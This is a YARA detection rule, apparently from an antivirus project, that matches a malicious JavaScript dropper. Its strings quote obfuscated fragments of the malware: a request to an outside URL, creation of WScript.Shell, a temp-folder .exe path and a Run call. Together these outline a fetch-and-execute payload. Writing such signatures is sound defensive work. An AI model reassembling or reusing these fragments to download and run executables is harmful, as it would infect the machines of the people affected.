rule sig_20160328_f41c2d6f21310856de1cee8f9548481c {
  meta:
    description = "datamaliciousorder - file 20160328_f41c2d6f21310856de1cee8f9548481c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "76ed11d6cc26d51757433f9890863f3960709d770056f9e648cd0d3a7ce99031"

  strings:
    $s1  = "function Ylnwn() {return Vxmwhdwh[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"xgYkygkvskwj6N.exe\";};" fullword ascii
    $s2  = "do {WScript[Upshbuyata](Smsqim() * 11)} while (Epfwud[\"readystate\"] < 4 );" fullword ascii
    $s3  = "function Jwfxvenh(Udfuea, Dfabfyd){return Udfuea - Dfabfyd;};" fullword ascii
    $s4  = "Epfwud[Hhumphn](\"GET\", \"http://www.stopeugenicsnow.eu/m8dhs\", false);" fullword ascii
    $s5  = "var Vxmwhdwh = function Yhhxes() {return WScript[Wokgql](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Qcgvwfh() {return ((Khuwqxmmch == true) && (Khuwqxmmch == Xigjdfros)) ? 1 : Vqyahwhm;};" fullword ascii
    $s7  = "function Hbzwchlv(Hpalhzjsdh){Vxmwhdwh[\"Run\"](Hpalhzjsdh, Vqyahwhm, Vqyahwhm);};" fullword ascii
    $s8  = "Khuwqxmmch = true; " fullword ascii
    $s9  = "function Hilqbd(Pvmoum) {var Xvzcbuy = (1, 2, 3, 4, 5, Pvmoum); return Xvzcbuy;};" fullword ascii
    $s10 = "Xigjdfros = true; " fullword ascii
    $s11 = "function Rblqribtu(){return Wokgql;};" fullword ascii
    $s12 = "var Xigjdfros = false;" fullword ascii
    $s13 = "var Vnnan = false;" fullword ascii
    $s14 = "var Nqhvnsiym = new this[\"Date\"]();" fullword ascii
    $s15 = " while (Lxzphmila){" fullword ascii
    $s16 = "var Khuwqxmmch = false;" fullword ascii
    $s17 = "return Jwfxvenh(Qlyeyh, Mecnc);" fullword ascii
    $s18 = "function Smsqim(){return 22;};" fullword ascii
    $s19 = "function Zizcr(){return Nlmzob;};" fullword ascii
    $s20 = "function Nfsewbqsj()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}